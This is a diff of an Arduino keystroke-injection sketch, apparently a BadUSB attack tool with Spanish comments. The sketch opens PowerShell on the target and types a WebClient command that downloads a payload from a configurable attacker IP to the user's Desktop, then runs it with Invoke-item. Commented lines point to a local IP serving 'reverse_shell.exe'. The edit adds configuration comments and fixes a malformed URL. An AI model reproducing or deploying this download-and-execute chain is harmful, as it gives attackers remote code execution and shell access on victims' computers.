@@ -27,14 +27,20 @@ void setup(){
   Tipear("PowerShell"); 
   Enter();
   delay(2000);
+  // --------------------------------------------------- CONFIGURA LO QUE QUIERAS AQUI-------------------------------------------------------------------------------
+
+
   Tipear("(New-Object System.Net.WebClient).DownloadFile(\"http://{DIRECCION IP}/{NOMBRE DEL PAYLOAD}\", \"$($Env:userprofile)/Desktop/{NOMBRE DEL PAYLOAD}\")");
   Enter();
   delay(2000);
   Tipear("Invoke-item $Env:userprofile/Desktop/{NOMBRE DEL PAYLOAD}");
   Enter();
   delay(1000);
-// (New-Object Net.WebClient).DownloadFile('http://http://192.168.1.235/reverse.exe/reverse_shell.exe','reverse_shell.exe')
+// (New-Object Net.WebClient).DownloadFile('http://192.168.1.235/reverse.exe/reverse_shell.exe','reverse_shell.exe')
 //$webclient.DownloadFile("http://192.168.1.235/reverse.exe", "$($Env:userprofile)/reverse.exe")
+
+
+  // ----------------------------------------------------------------------------------------------------------------------------------------------------------------------
   delay(500);
   Keyboard.end();
   digitalWrite(LED_BUILTIN, LOW);
